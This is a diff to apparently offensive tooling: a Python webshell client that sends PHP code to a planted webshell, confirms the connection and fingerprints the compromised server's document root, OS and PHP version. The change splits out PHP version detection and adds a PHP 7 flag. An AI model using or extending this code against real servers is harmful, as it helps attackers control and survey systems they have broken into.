@@ -38,10 +38,14 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
         path.join(gget("root_path"), "target", webshell_netloc),
         namespace="webshell",
     )
+    req = send("print(phpversion());", raw=True)
+    gset("webshell.php_version", req.text.strip(), namespace="webshell")
+    if ('7.' in req.text):
+        gset("webshell.v7", True, namespace="webshell")
     req = send("print(md5(1));")
     if "c4ca4238a0b923820dcc509a6f75849b" in req.r_text:  # 验证是否成功连接
         info_req = send(
-            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.phpversion());"
+            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname());"
         )
         info = info_req.r_text.strip().split("|")
         gset("webshell.root", info[0], namespace="webshell")
@@ -51,7 +55,6 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
             (True if "win" in info[1].lower() else False),
             namespace="webshell",
         )
-        gset("webshell.php_version", info[2], namespace="webshell")
         from_log = gget("webshell.from_log", "webshell")
         if not from_log:
             with open("webshell.log", "a+") as f:
